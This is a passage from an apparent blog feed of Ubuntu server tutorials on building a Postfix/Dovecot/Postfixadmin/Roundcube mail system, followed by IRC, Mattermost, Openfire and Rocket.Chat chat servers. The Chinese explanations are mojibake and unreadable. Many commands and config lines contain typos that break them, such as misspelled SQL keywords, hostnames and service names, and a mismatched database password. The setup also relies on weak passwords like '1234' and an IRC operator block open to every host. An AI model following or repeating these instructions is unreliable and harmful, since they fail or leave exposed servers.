ä¼ä¸šçº§Postfixé‚®ä»¶ç³»ç»Ÿéƒ¨ç½²ç»„ä»¶ Postfix: MTA Dovecot: POP /IMAPæœåŠ¡ SASL: èº«ä»½è®¤è¯ Postfixadmin: ç®¡ç†é‚®ä»¶ã€è™šæ‹ŸåŸŸã€åˆ«åç­‰çš„WEBåº”ç”¨ LEMPï¼šPostfixadminçš„webç¯å¢ƒä¾èµ– Postfixçš„ä¸¤ç§åŸŸ Local Domainï¼šä¸ºæœ¬ç³»ç»Ÿè´¦å·æŠ•é€’é‚®ä»¶(/etc/passwd) Virtual Domainï¼šä¸ºéæœ¬ç³»ç»Ÿè´¦å·æŠ•é€’é‚®ä»¶ 1.å®‰è£…LEMPsudo apt install nginx sudo apt install mysql-server sudo mysql_secure_installation sudo mysql ALTER USER 'root'@'localhost' INDETIFIED WITH mysql_native_password BY '1234'; # ä¿®æ”¹ç™»å½•æ–¹å¼ FLUSH PROVILEGES; # mysql -u root -p1234 sudo apt install php-fpm php-mysql sudo vim /etc/php/7.2/fpm/php.ini cgi.fix_pathinfo=0 date.timezone = Asia/Shanghai ## éªŒè¯èƒ½å¦æ­£å¸¸ä½¿ç”¨ sudo vim /etc/nginx/sites-avaliable/default index index.php server_name mail.qq.com; location ~\.php${ include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; } location ~/.ht{ deny all; } sudo vim /var/www/html/info.php &lt;?php phpinfo(); ?> systemctl restart nginx.service systemctl restart php7.2-fmp.service 2.å®‰è£…Postfixadminæ¨èæ‰‹åŠ¨ä¸‹è½½æºç ï¼Œç„¶åè§£å‹ # å®‰è£…ä¾èµ–åŒ… sudo apt install php-imap php-mbstring php7.2-imap php7.2-mbstring # ä¸‹è½½æºç  sudo wget -P /opt https://github.com/postfixadmin/postfixadmin/archive/postfixadmin-3.2.4.tar.gz cd /opt &amp;&amp; tar -xvf postfixadmin-3.2.tar.gz mv postfixadmin-postfixadmin3.2/ postfixadmin # /opt/postfixadmin/public/setup.php # åšwebç•Œé¢é…ç½®çš„æ–‡ä»¶ # è½¯é“¾æ¥ç›®å½• ln -s /opt/postfixadmin/public/ /var/www/html/pfa 3.é…ç½®æ•°æ®åº“# mysql -u root -p # åˆ›å»ºæ•°æ®åº“å’Œåå­— CREATE DATABASE postfix_db; CREATE USER 'post_user'@'localhost' IDENTIFIED BY '1234'; GRANT ALL PRIVILEGES ON postfix_db.* TO 'post_user'@'localhost' FLUSH PRIVILEGES; Postfixadmin æ•°æ®åº“è¿æ¥æ–‡ä»¶ cd /opt/postfixadmin/ &amp;&amp; cp config.inc.php config.local.php sudo vim config.local.php $CONF['configured'] = true; $CONF['default_language'] = 'cn'; # æ•°æ®åº“è¿æ¥ä¿¡æ¯ $CONF['database_type'] = 'mysqli'; $CONF['database_host'] = 'localhost'; $CONF['database_password'] = '1234'; $CONF['database_name'] = 'postfix_db' 4.åˆ›å»ºä¸´æ—¶ç›®å½•mkdir /opt/postfixadmin/templates_c &amp;&amp; chmod 755 -R /opt/postfixadmin/templates_c chown -R www-data:www-data /opt/postfixadmin/templates_c 5.WEBå®‰è£…é˜¶æ®µ# è®¿é—®å‰é¢è®¾ç½®çš„urlå’Œæ–‡ä»¶ http://mail.qq.com/setup.php è®¾ç½® setup password ç”Ÿæˆ setup password çš„hashå€¼ï¼Œå¤åˆ¶ä¸‹æ¥ï¼Œæ·»åŠ åˆ°æœåŠ¡ç«¯ä¸­é…ç½®é¡¹ # vim config.local.php $['setup_password'] = 'xxxxxxx hash xxxxxxxx' ç„¶ååˆ›å»ºç®¡ç†å‘˜è´¦å·ä¸å¯†ç  ç™»å½•ç®¡ç†å‘˜è´¦å· åˆ›å»ºè™šæ‹ŸåŸŸã€é‚®ç®±è´¦å· åŸŸåæ¸…å• â€“ æ–°å»ºåŸŸ è™šæ‹Ÿç”¨æˆ·æ¸…å• â€“ æ–°å»ºé‚®ç®±ï¼ˆåˆ«åï¼‰ 6.é›†æˆPostfix ä»¥ä¸‹å‘½ä»¤ä»¥rootæƒé™è¿è¡Œ apt install Postfix Postfix-mysql sasl2-bin # saslæ¥å®ç°èº«ä»½è®¤è¯ é…ç½®saslè‡ªåŠ¨å¯åŠ¨ # vim /etc/default/saslauthd START=yes systemctl restart saslauthd.service é‚®ç®±ç›®å½•ã€è®¿é—®è´¦å·ã€ç»„ # æ·»åŠ ç»„è´¦å·vmail groupadd -g 5000 vmail &amp;&amp; mkdir -p /var/mail/vmail # åˆ›å»ºè´¦å·vmail, å±äºç»„vmail useradd -u 5000 vmail -s /usr/sbin/nologin -d /var/mail/vmail chown -R vmail:vmail /var/mail/vmail 7.æ•°æ®åº“é…ç½®(3ä¸ª)æ•°æ®åº“é…ç½®æ–‡ä»¶1 mkdir -p /etc/postfix/sql # å»æ•°æ®åº“ä¸­æ‰¾è™šæ‹ŸåŸŸçš„åŸŸå vim /etc/postfix/sql/mysql_virtual_domains_maps.cf user = post_user password = 1234 hosts = 127.0.0.1 dbname = postfix_db query = SELECT domain FROM domain WHERE domain='%s' AND active='1' # æƒ³è¦ç”Ÿæ•ˆï¼Œé…ç½®åŠ å…¥ /etc/postfix/main.cf postconf -e virtual_mailbox_domains=mysql:/etc/postfix/sql/mysql_virtual_domains_maps.cf # ä½¿ç”¨ä¸Šé¢é…ç½®çš„é…ç½®æ–‡ä»¶,æ¥æŸ¥è¯¢è™šæ‹ŸåŸŸ postmap -q qq.com mysql:/etc/postfix/sql/mysql_virtul_domains_maps.cf # éªŒè¯ æ•°æ®åº“é…ç½®æ–‡ä»¶2 # æŸ¥é‚®ç®± vim /etc/postfix/sql/mysql_virtual_mailbox_maps.cf user = post_user password = 1234 hosts = 127.0.0.1 dbname = postfix_db query = SELECT maildir FROM mailbox WHERE username='%s' AND active='1' # æƒ³è¦ç”Ÿæ•ˆï¼Œé…ç½®åŠ å…¥ /etc/postfix/main.cf postconf -e virtual_mailbox_domains=mysql:/etc/postfix/sql/mysql_virtual_mailbox_maps.cf # ä½¿ç”¨ä¸Šé¢é…ç½®çš„é…ç½®æ–‡ä»¶ postmap -q tom@qq.com mysql:/etc/postfix/sql/mysql_virtual_mailbox_maps.cf # éªŒè¯ æ•°æ®åº“é…ç½®æ–‡ä»¶3 # æŸ¥åˆ«å vim /etc/postfix/sql/mysql_virtual_alias_maps.cf user = post_user password = 1234 hosts = 127.0.0.1 dbname = postfix_db query = SELECT goto FROM alias WHERE address='%s' AND active='1' # æƒ³è¦ç”Ÿæ•ˆï¼Œé…ç½®åŠ å…¥ /etc/postfix/main.cf postconf -e mysql_virtual_alias_maps=mysql:/etc/postfix/sql/mysql_virtual_alias_maps.cf # ä½¿ç”¨ä¸Šé¢é…ç½®çš„é…ç½®æ–‡ä»¶ postmap -q abuse@qq.com mysql:/etc/postfix/sql/mysql_virtual_alias_maps.cf # éªŒè¯ æƒé™ï¼Œå±ä¸» chgrp postfix /etc/postfix/sql/mysql_* è‡³æ­¤ï¼Œpostfixadminä¸postfix MTAå®‰è£…å®Œæˆ 8.å¯ç”¨SASL å¼ºåˆ¶ Postfixå‘é‚®ä»¶ä½¿ç”¨Dovecotè¿›è¡Œèº«ä»½éªŒè¯# vim /etc/postfix/main.cf smtpd_sasl_type = dovecot smtpd_sasl_path = private/auth smtpd_sasl_auth_enable = yes smtpd_sasl_security_options = noanonymous smtpd_sasl_local_domain = $myhostname smtpd_tls_security_level = may smtpd_tls_auth_only = no smtpd_recipient_restrictions = permit_mynetworks permit_sasl_authenticated reject_unauth_destination 9.å¯åŠ¨å®‰å…¨SMTPç«¯å£# vim /etc/postfix/master.cf submission inet n - y - - smtpd -o syslog_name=postfix/submission -o smtpd_tls_security_level=encrypt -o smtpd_sasl_aut_enable=yes -o smtpd_client_restrictions=permit_sasl_authenticated,reject -o milter_macro_daemon_name=ORIGINATING smtps inet n - y - - smtpd -o syslog_name=postfix/smtps -o smtpd_tls_wrappermode=yes -o smtpd_sasl_aut_enable=yes -o smtpd_client_restrictions=permit_sasl_authenticated,reject -o milter_macro_daemon_name=ORIGINATING 10.éªŒè¯é…ç½®# éªŒè¯é…ç½® postcnf -n # é‡å¯æœåŠ¡ sytemctl restart postfix # è¯ä¹¦å¯è‡ªè¡Œæ›¿æ¢ 11.å®‰è£…/é…ç½®Dovecot# å®‰è£…Dovecot apt install dovecot-imapd dovecot-mysql dovecot-managesieved dovecot-pop3d # Sieve è´Ÿè´£åˆ›å»ºå¹¶å°†é‚®ä»¶è‡ªåŠ¨æ”¾å…¥æŒ‡å®šç”¨æˆ·æ–‡ä»¶å¤¹ é…ç½®Dovecotï¼ˆå¤šé…ç½®æ–‡ä»¶ï¼‰ cd /etc/dovecot/conf.d/ &amp;&amp; vim 10-auth.conf # ç³»ç»Ÿè´¦å·/SQLè´¦å· auth_mechanisms = plain login #!include auth-system.conf.ext !include auth-sql.conf.ext # ä½¿ç”¨è¿™ä¸ªé…ç½®æ–‡ä»¶æ¥è®¿é—®æ•°æ®åº“ é…ç½®SQLè´¦å· # vim /etc/dovecot/conf.d/auth-sql.conf.ext passdb { driver = sql args = /etc/dovecot/dovecot-sql.conf.ext # è¿æ¥æ•°æ®åº“æ–‡ä»¶ } userdb { # ç”¨æˆ·æ•°æ®åº“ driver = static args = uid=vmail gid=vmail home=/var/mail/vmail/%d/%n } è¿æ¥æ•°æ®åº“é…ç½®æ–‡ä»¶ # vim /etc/dovecot/conf.d/dovecot-sql.conf.ext driver = mysql connect = host=127.0.0.1 dbname=postfix_db password=1324 password_query = SELECT usernme,domain,password FROM mailbox WHERE username='%u',default_pass_schema=MD5-CRYPT æŒ‡å®šé‚®ç®±å­˜å‚¨ä½ç½® # vim /etc/dovecot/conf.d/10-mail.conf mail_location = maildir:/var/mail/vmail/%d/%n/Maildir mail_privileged_group = mail é…ç½®æœåŠ¡è¿æ¥ # vim /etc/dovecot/conf.d/10-master.conf service auth { unix_listener auth-userdb { mode = 0600 # æƒé™æ©ç  user = vmail group = vmail } unix_listener /var/spool/postfix/privilege/auth { mode = 0660 user = postfix group = postfix } user = dovecot # ä¿®æ”¹ä¸ºæˆ‘ä»¬æŒ‡å®šçš„dovecotæ°¸å›º } é…ç½®sieve # vim /etc/dovecot/conf.d/15-lda.conf protocol lda { mail_plugins = mail_plugin sieve # sieveç»„ä»¶ï¼Œä¼šå¸®æˆ‘ä»¬è‡ªåŠ¨åˆ›å»ºæ–‡ä»¶å¤¹ } chgrp vmail /etc/dovecot/dovecot.conf # vmailæ‰§è¡ŒDovecot é‡å¯æœåŠ¡ systemctl restart dovecot æŸ¥çœ‹æ—¥å¿— tail -n 20 -f /var/log/mail.log # å¯ä»¥çœ‹åˆ°å‰é¢çš„æœåŠ¡å¯åŠ¨æ­£å¸¸ 12.é›†æˆPostfixä¸Dovecot# vim /etc/postfix/master.cf dovecot unix - n n - - pipe flags = DRhu user=vmail:vmail argv=/usr/lib/dovecot/deliver -f ${sender} -d xxxxxx # vim /etc/postfix.main.cf virtual_transport = dovecot dovecot_destination_recipient_limit=1 ## é‡å¯æœåŠ¡ systemctl restart dovecot tail -n 20 -f /var/log/mail.log # å¯ä»¥çœ‹åˆ°å‰é¢çš„æœåŠ¡å¯åŠ¨æ­£å¸¸ 13.æµ‹è¯•å‘é€é‚®ä»¶ ä½¿ç”¨postfixadmin çš„webç•Œé¢æ¥å‘é€é‚®ä»¶ # æˆ–è€… ä½¿ç”¨mailå‘é€é‚®ä»¶ apt install mailutils echo "hello xpshuai" | mail "test mail" tom@qq.com æŸ¥çœ‹ç»“æœ tail -n 20 -f /var/log/mail.log ls -l /var/mail/vmail # æ¯ä¸ªåŸŸçš„é‚®ä»¶å­˜å‚¨çš„ç›®å½• å¢åŠ å…¶ä»–è™šæ‹ŸåŸŸã€é‚®ç®±(`jerry@taobao.com`) echo "hello jerry, it's tom" |mail -s "Subject"-a From"tom\&lt;tom@qq.com>\jerry@taobao.com é…ç½®é‚®ä»¶å®¢æˆ·ç«¯Outlook,Thunderbird, â€¦ â€¦æ·»åŠ æ–°é‚®ç®±è´¦å·ï¼ˆåå­—ï¼Œåœ°å€ï¼Œå¯†ç ï¼‰é…ç½®Imapã€pop3ã€smtpç­‰çš„åœ°å€ï¼ŒSSLåŠ å¯† Web MAILå®‰è£…å„å¤§é‚®ä»¶æœåŠ¡å•†å…¨éƒ¨æä¾›Web MailåŸºäºæµè§ˆå™¨çš„ç»Ÿä¸€ä½¿ç”¨ä½“éªŒï¼ˆæ— åºé…ç½®å®¢æˆ·ç«¯ï¼‰ Roundcube â€“ ä¸€æ¬¾éå¸¸æµè¡Œä¸”ç¨³å®šçš„Web Mailåº”ç”¨ 1.å®‰è£…ä¾èµ–åŒ…ï¼ˆå¯é€‰ï¼‰apt install php7.2-intl php-imagick php7.2-ldap 2.ä¸‹è½½Roundcubecd /var/www/html &amp;&amp; wget https://github.com/roundcube/roundcubemail/releases/download/1.4.7/roundcubemail-1.4.7-complete.tar.gz tar -xvf roundcubemail-1.4.7-complete.tar.gz mv roundcubemail-1.4.7-complete webmail &amp;&amp; cd webmail 3.åˆ›å»ºæ•°æ®åº“CREATE DATABASE roundcubedb; CREATE DATABASE routecubemail; CREATE USER 'roundcube'@'localhost' IDENTIFIED BY '1234'; GRANT ALL PRIVILEGES ON roundcubedb.* 'roundcube'@'loocalhost'; GRANT ALL PRIVILEGES ON routecubemail.* 'roundcube'@'loocalhost'; FLUSH PRIVILEGES; å¯¼å…¥æ•°æ® # å½“å‰ç›®å½•ä¸‹çš„SQLæ–‡ä»¶å¤¹ä¸‹çš„sqlæ–‡ä»¶ï¼ˆé’ˆå¯¹ä¸åŒç±»å‹çš„æ•°æ®åº“è¿›è¡Œå¯¼å…¥ï¼‰ mysql -u roundcube -p roundcubedb &lt; SQL/mysql.initial.sql 4.é…ç½®ç«™ç‚¹æ–‡ä»¶# è¿™é‡Œä½¿ç”¨é»˜è®¤çš„é…ç½®æ–‡ä»¶ vim /etc/nginx/sites-avaialable/default location /webmail { root /var/www/html;s index index.php; location ~ ^/webmaik/(.+\.php)$ { root /var/www/html; try files $uri=404; fastcgi_index index.php; fastcgi_pass unix:/run/php/php7.2-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root $fastcgi_script_name; include /etc/nginx/fastcgi_params; } location ~ ^/webmail/(README|INSTALL|LICENSE|CHANGELOG|UPGRADING)$ { deny all; } location ~ ^/webmail/(bin|SQL|config|temp|logs)/ { deny all; } } æ£€æŸ¥é…ç½® nginx -t é‡å¯æœåŠ¡ systemctl restart nginx 5.æƒé™chown -R www-data:www-data /var/www/html/webmail chmod 755 /var/www/html/webmail/temp /var/www/html/webmail/logs 6.Webå®‰è£…é˜¶æ®µ# è®¿é—®è·¯å¾„ http://mail.qq.com/webmail/installer ## æ£€æŸ¥ç¯å¢ƒ # ä¸€äº›ç»„ä»¶å¯èƒ½æ²¡å®‰è£…ï¼Œå¯ä»¥å®‰è£… apt install php-dompdf apt install php7.2-xml ## åˆ›å»ºé…ç½®æ–‡ä»¶ ... # IPæ£€æŸ¥ # è®¾ç½®æ•°æ®åº“å¯†ç  # managesieve # ...å…·ä½“çš„è‡ªå·±çœ‹é…ç½® ## åˆå§‹åŒ–æ•°æ®åº“ åˆ é™¤installerç›®å½• ç™»å½•Web Mail ## è®¿é—®webç•Œé¢ http://mail.qq.com/webmail document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu server</tag>
        <tag>é‚®ä»¶æœåŠ¡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu sever-èŠå¤©æœåŠ¡]]></title>
    <url>%2Fposts%2F43174%2F</url>
    <content type="text"><![CDATA[èŠå¤©æœåŠ¡ä¸IRCæœåŠ¡ æ²Ÿé€šæ˜¯æœ€é‡è¦çš„é—®é¢˜ å‘æ˜ç½‘ç»œçš„ç›®çš„çš„æ²Ÿé€š(ä¿¡æ¯äº¤æ¢) é«˜æ•ˆçš„æ²Ÿé€šæ˜¯ç”Ÿäº§åŠ› ä¸ºä»€ä¹ˆä¸ç”¨QQã€å¾®ä¿¡ã€Telegramï¼Ÿ ä¼ä¸šä¿¡æ¯æµç»ä»–äººæœåŠ¡å™¨ï¼ˆæ³„å¯†ï¼‰ å†…éƒ¨ä¿¡æ¯å†…éƒ¨ä¼ é€’æ•ˆç‡æ›´é«˜ æ›´ä¸“æ³¨äºå…¬å¸å†…éƒ¨å·¥ä½œå†…å®¹ IRCInternet Relay Chatï¼ˆå› ç‰¹ç½‘ä¸­ç»§èŠå¤©ï¼‰æ˜¯ä¸€ç§é€šè¿‡ç½‘ç»œçš„ç¾¤ä½“å³æ—¶èŠå¤©æ–¹å¼ï¼ˆä¹Ÿå¯ä»¥ç”¨äºä¸ªäººé—´èŠå¤©ï¼‰å…¬å¼€çš„åè®®ï¼ˆTCPå’ŒSSLåè®®ï¼‰IRCæœåŠ¡å™¨å¯ä»¥è¿æ¥å…¶ä»–çš„IRCæœåŠ¡å™¨å½¢æˆä¸€ä¸ªIRCç½‘ç»œå¤§å¤šæ•°çš„IRCæœåŠ¡å™¨ä¸éœ€è¦å®¢æˆ·æ³¨å†Œç™»å½•ç›®å‰å·²ç»å¾ˆå°‘è§ï¼ˆé»‘å®¢å’Œè€ç‰Œçš„æŠ€æœ¯ç¾¤ä½“çš„æŒšçˆ±ï¼‰éƒ¨åˆ†æµæœåŠ¡å•†ä¾èµ–IRCåè®®è¿›è¡Œä¿¡æ¯ä¼ é€’ IRCæœåŠ¡å™¨çš„æ­å»ºIrcd-Hybridä¸ºä¾‹ å®‰è£…é…ç½®ç®€å• ç³»ç»Ÿèµ„æºå ç”¨ä½ 1.å®‰è£… # å®‰è£…æœåŠ¡ç«¯ sudo apt install ircd-hybrid 2.ç®¡ç†å‘˜å£ä»¤(operator) # è®¾ç½®ç®¡ç†å‘˜çš„å¯†ç ï¼ˆåŠ å¯†çš„æ–¹å¼ä¿å­˜å¯†æ–‡ï¼‰ mkpaswd pass123 # ç”Ÿæˆå¯†æ–‡ï¼Œä¸€ä¼šåœ¨åé¢ç”¨ 3.é…ç½® # sudo vim /etc/ircd-hybrid/ircd.conf serverinfo { name = "irc.lab.com" description = "LAB Campany IRC Server" network_name = "This is my Beijing Office IRC Network" # å…¶ä»–é…ç½®é¡¹... } operator { # ç®¡ç†å‘˜çš„ç‰‡æ®µï¼ˆé»˜è®¤æ˜¯æ³¨é‡Šçš„ï¼‰ name = "admin" user = "*@*"; # é™åˆ¶å¯ä»¥è¿æ¥çš„ç”¨æˆ·å’Œipåœ°å€ï¼Œè¿™é‡Œæ˜¯æ‰€æœ‰ç”¨æˆ·æ‰€æœ‰ä¸»æœº password = "xxxxxx" # ä¸Šé¢mkpaswd pass123 ç”Ÿæˆçš„å¯†æ–‡ } # åé¢æ ¹æ®éœ€è¦é…ç½® 4.Banner sudo vim /etc/ircd-hybrid/ircd.motd # å®¢æˆ·ç«¯ç™»å½•ä¿¡æ¯çš„ä¿¡æ¯ 5.é‡å¯æœåŠ¡ sudo systemctl restart ircd-hybrid.service 6.å®¢æˆ·ç«¯ - mIRC # Winä¸‹çš„ä¸€æ¬¾å•†ä¸šè½¯ä»¶ - irssi # Linuxä¸‹å¸¸ç”¨ # å®‰è£… sudo apt install irssi sudo apt install ident2 # æœåŠ¡ç«¯æ‰èƒ½è®¿é—®è¯¥å®¢æˆ·ç«¯çš„è®¡ç®—æœºåç­‰ä¿¡æ¯ # å®¢æˆ·ç«¯ç›´æ¥è¿æ¥æœåŠ¡ç«¯å°±è¡Œ irssi -c 192.168.175.130 # æœåŠ¡ç«¯å£ï¼Œé»˜è®¤ 666x 7.å®¢æˆ·ç«¯åŸºæœ¬å‘½ä»¤ /help # æŸ¥çœ‹æ‰€æœ‰å‘½ä»¤ /help channel /opera admin pass123 /channel list # æŸ¥çœ‹é¢‘é“ /channel add -auto #Football # æ·»åŠ é¢‘é“ /join #Football # åŠ å…¥æŒ‡å®šçš„èŠå¤©å®¤ # æŠŠè‡ªå·±æå‡ä¸ºç®¡ç†å‘˜èº«ä»½ /oper admin pass123 MatterMostæœåŠ¡æ­å»º irssiè¿™ç§å‘½ä»¤è¡Œçš„æ–¹å¼å¹¶ä¸æ˜¯å¾ˆå‹å¥½ï¼ŒMatterMostä½¿ç”¨ååˆ†å‹å¥½ å›¢é˜Ÿç¾¤èŠSaaSå¹³å° Goè¯­è¨€å¼€å‘ ç‹¬ç«‹ä¸æ“ä½œç³»ç»Ÿçš„äºŒè¿›åˆ¶éƒ¨ç½²æ–¹æ¡ˆ(å®ƒå·²ç»ç»™æ‰“åŒ…å¥½äº†) åŸºäºMySQLã€Postgresqlæ•°æ®åº“ Slack(æ”¶è´¹)çš„æ›¿ä»£é€‰æ‹©æ–¹æ¡ˆ(å…¼å®¹Slackï¼ŒäºŒè€…å¯è¿›è¡Œé€šä¿¡) å…¨å¹³å°å®¢æˆ·ç«¯æ”¯æŒï¼ˆWebï¼‰ å…è´¹ç‰ˆã€æ”¶è´¹ç‰ˆ é€‚ç”¨äºä¼ä¸šå†…éƒ¨å›¢é˜Ÿæ–‡ä»¶å…±äº«å’Œä¿¡æ¯äº¤æ¢ æœåŠ¡ç«¯ï¼šhttps://github.com/mattermost/mattermost-serverå®¢æˆ·ç«¯ç¨‹åºï¼šhttps://github.com/mattermost/desktopWebç•Œé¢çš„ï¼šhttps://github.com/mattermost/mattermost-webapp å®‰è£…éƒ¨ç½²1.å®‰è£…æ•°æ®åº“ # è¿™é‡Œä»¥mysqlä¸ºä¾‹ sudo apt install mysql-server sudo mysql_secure_installation 2.å»ºåº“ create user 'muser'@'%' identified by '12345678'; create database mattermost; grant all privileges on mattermost.* to'muser'@'%'; -- GRANT ALTER,CREATE,DELETE,DROP,INDEX,INSERT,SELECT,UPDATE ON mattermost.* to'muser'@'%'; flush privileges; 3.ä¸‹è½½mattermost wget https://releases.mattermost.com/5.24.2/mattermost-5.24.2-linux-amd64.tar.gz tar -zxvf mattermost*.gz sudo mv mattermost /opt # ä¸ªäººå®‰è£…çš„è½¯ä»¶åŒ…ï¼Œä¸€èˆ¬ä¼šæ”¾åˆ°optä¸‹é¢ sudo mkdir /opt/mattermost/data cd /opt 4.æƒé™è®¾ç½® sudo useradd -rU mattermost sudo chown -R mattermost:mattermost /opt/mattermost sudo chmod -R g+w /opt/mattermost 5.é…ç½®æ–‡ä»¶ # sudo vim /opt/mattermost/config/config.json # è¿™é‡Œé…ç½®æ•°æ®åº“é¡¹ï¼Œ mattermoståº“çš„åå­— "DriverName": "mysql" "DataSource": "muser:passw123@tcp(localhost:3360)/mattermost?charset=utf8mb4,utf8&amp;readTimeout=30s&amp;writeTimeout=30s" 6.æµ‹è¯•æ•°æ®åº“è¿æ¥ sudo -u mattermost /opt/mattermost/bin/mattermost # é‡ç‚¹å…³æ³¨ç«¯å£æ˜¯å¦æ­£å¸¸å¼€å¯ï¼Œä¸€èˆ¬é»˜è®¤ä¸º8065ç«¯å£ 7.Systemd æœåŠ¡å•å…ƒæ–‡ä»¶ # mattermostæœ¬èº«æ˜¯ä¸å¸¦serviceçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨åˆ›å»º sudo touch /lib/system/mattermost.service # æ·»åŠ å†…å®¹... 8.ä¸­æ–‡å­—ä½“ # sudo vim /opt/mattermost/config/config.json "DefaultServerLocale": "zh-CN" "DefaultClientLocale": "zh-CN" "AvailableLocale": "zh-CN" 9.å¯åŠ¨æœåŠ¡ sudo systemctl daemon-reload # ä¿®æ”¹å®Œå†å¯åŠ¨æœåŠ¡ sudo systemctl start mattermost.service sudo systemctl enable mattermost.service # ç„¶åæŸ¥çœ‹æœåŠ¡ sudo systemctl status mattermost.service 10.Webé…ç½® # åŸŸåæ ¹æ®è‡ªå·±çš„æ¥ï¼Œæˆ–ipä¹Ÿè¡Œ https://chat.lab.com:8065 # é¦–ä¸ªè´¦å·è¢«èµ‹äºˆsystem_adminè§’è‰²ï¼ˆç®¡ç†å‘˜ï¼‰ å»ºè®®ï¼šå…ˆå»ºç«‹ä¸€ä¸ªå›¢é˜Ÿ(ç›¸å½“äºä¸€ä¸ªèŠå¤©å®¤) ç„¶åå¯ä»¥æ ¹æ®æç¤ºä¸‹è½½å®¢æˆ·ç«¯ 11.ç³»ç»Ÿæ§åˆ¶å°é…ç½® å¸¸è§„->æœåŠ¡ç«¯å£(å…ˆæŒ‡å®šé¡µé¢ä¸Šçš„å‘½ä»¤ï¼Œå†åœ¨webç•Œé¢ä¿®æ”¹)ï¼Œè¯ä¹¦ï¼Œåœ°å€ï¼Œdataå­˜å‚¨ç›®å½•(æœ¬åœ°å­˜å‚¨/äº‘å­˜å‚¨),ç”µå­é‚®ä»¶é€šçŸ¥ sudo setcap_net_bind_service=+ep./bin/mattermost # ä¿®æ”¹æœåŠ¡ç«¯å£ 12.ä½¿ç”¨ # åˆ«äººè¿›æ¥çš„æ–¹å¼ï¼š 1.é‚€è¯·é“¾æ¥ 2.å•ç‹¬æ·»åŠ æˆå‘˜ # å®¢æˆ·ç«¯ï¼š - Webç‰ˆ - å…¶ä»–æ“ä½œç³»ç»Ÿå®¢æˆ·ç«¯ # æ”¯æŒå…¶ä»–æ’ä»¶ï¼Œå¯ä»¥ä¸ç¬¬ä¸‰æ–¹è½¯ä»¶é›†æˆä½¿ç”¨ æ–‡ä»¶çš„ä¼ é€ï¼Œå…±äº«æ–‡ä»¶ï¼Œç½®é¡¶æ–‡ä»¶ OpenfireæœåŠ¡æ­å»ºå¼€æºå…è´¹çš„IMå³æ—¶é€šä¿¡æœåŠ¡å™¨Real-time collaboration(RTC)ç”±javaå¼€å‘ï¼Œéœ€è¦javaè¿è¡Œç¯å¢ƒä½¿ç”¨æ‹“å±•é€šè®¯å’Œè¡¨ç¤ºåè®®ï¼ˆXMPPï¼‰Extensible Messaging and Presence Protocolå·ç§°å•å°æœåŠ¡å™¨å¯æ”¯æŒä¸Šä¸‡å¹¶å‘ç”¨æˆ·å…¼å®¹æ‰€æœ‰æ”¯æŒXMPPåè®®çš„å®¢æˆ·ç«¯(spark),ä¸å»ºè®®webçš„æ–¹å¼(åŸºäºflash)æ”¯æŒæ’ä»¶å¼€å‘æ”¯æŒmysqlã€postgrersqlã€å†…å»ºæ•°æ®åº“æ”¯æŒLDAPã€TLSã€ç¾¤é›†éƒ¨ç½² æ­å»ºæœåŠ¡ç«¯1.javaç¯å¢ƒ sudo apt-get install openjdk-8-jdk java -version 2.æ•°æ®åº“ # è¿™é‡Œä»¥mysqlä¸ºä¾‹ sudo apt install mysql-server sudo mysql_secure_installation 3.å»ºåº“ create database openfire; grant all privileges on openfire.* to'fireuser'@'%' identified by 'pass123'; flush privileges; 4.ä¸‹è½½ï¼Œå®‰è£… # http://www.igniterealtime.org/downloads/index.jsp#openfire sudo dpkg -i openfire.deb 5.å¯¼å…¥æ•°æ®åº“è¡¨ sudo mysql; show databases; use openfire; source /usr/share/openfire/resources/databases/openfire_mysql.sql show tables; 6.Webç•Œé¢é…ç½® ## http://openfire.lab.com:9090 #è¿›è¡Œå¸¸ç”¨é…ç½® #æ•°æ®åº“URLè·¯å¾„ï¼š åœ°å€:ç«¯å£:åº“å jdbc:mysql://127.0.0.1/openfire?useUnicode=true&amp;chasacterEncoding=UTF-8&amp;characterSetResults=UTF-8&amp;rewriteBatchedStatements=true # é€šè¿‡Webè¿›å…¥ç®¡ç†ç•Œé¢ 7.åˆ›å»ºç”¨æˆ·è´¦å· å®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨sparkhttp://www.igniterealtime.org/downloads/index.jsp#openfireå®¢æˆ·ç«¯ç™»å½•å¿½ç•¥è¯ä¹¦çˆ†ç²—å¹³sparkä½¿ç”¨5222ç«¯å£è¿æ¥æœåŠ¡ç«¯ Rochet ChatæœåŠ¡æ­å»ºä¸Mattermostç±»ä¼¼å›¢é˜Ÿç¾¤èŠSaaSå¹³å°Slackçš„æ›¿ä»£é€‰æ‹©æ–¹æ¡ˆå…¨å¹³å°å®¢æˆ·ç«¯æ”¯æŒ(WEB)é€‚ç”¨äºä¼ä¸šå†…éƒ¨æ–‡ä»¶å…±äº«å’Œä¿¡æ¯äº¤æ¢ç‹¬ç«‹äºæ“ä½œç³»ç»Ÿçš„Snapéƒ¨ç½²æ–¹å¼ å®‰è£…å®‰è£…å¼‚å¸¸ç®€å• F1.è‡ªåŠ¨å®‰è£…# æ¨è sudo snap install rocketchat-server F2.æ‰‹åŠ¨å®‰è£…1.å®‰è£…æ•°æ®åº“ sudo apt install mongodb 2.å®‰è£…ä¾èµ– sudo apt install node.js build-essential npm 3.æŒ‡å®šNode.jsç‰ˆæœ¬ sudo npm install -g n sudo n 8.9.3 # è¿™é‡Œçš„ç‰ˆæœ¬è‡ªå·±æŸ¥çœ‹ä¸€ä¸‹ç›®å‰æ”¯æŒçš„ç‰ˆæœ¬å· 4.ä¸‹è½½æœåŠ¡ç«¯æºç ï¼Œå¹¶å®‰è£… # ä¸‹è½½åœ°å€ï¼š https://releases.rocket.chat/latest/download tar -zxcf xxx.tgz cd bundle/programs/server npm install cd ../ export ROOT_URL=http://1.1.1.1ï¼š3000/ export MONGO_URL=mongodb://localhost:27017/rocketchat export PORT=3000 node main.js # å¯åŠ¨æœåŠ¡ç«¯ç¨‹åº 5.è®¿é—®Webé¡µé¢ # 